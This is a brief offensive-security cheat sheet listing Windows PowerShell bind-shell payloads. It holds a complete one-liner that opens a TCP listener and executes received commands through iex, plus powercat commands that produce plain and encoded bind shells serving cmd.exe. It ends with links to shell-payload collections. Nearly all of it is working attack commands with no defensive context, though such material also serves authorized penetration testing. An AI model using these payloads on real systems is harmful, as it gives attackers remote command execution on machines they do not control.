# Powershell

## 01 - Regular Shell

```powershell
C:\> powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',<PORT>);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

## 02 - Generate via Powercat

Generate bind shell.

```
> powercat -l -p <PORT> -e cmd.exe -g
```

Generate encoded bind shell.

```
> powercat -l -p <PORT> -e cmd.exe -ge
```

## References

- [Hacktricks Shell Windows](https://book.hacktricks.xyz/shells/shells/windows)

- [Powercat](https://github.com/besimorhino/powercat)

- [Commands in Windows to Get Shell](https://ironhackers.es/en/cheatsheet/comandos-en-windows-para-obtener-shell/)

- [Awesome Reverse Shell](https://github.com/MrPineMan/Awesome-Reverse-Shell)

- [One-Lin3r](https://github.com/D4Vinci/One-Lin3r)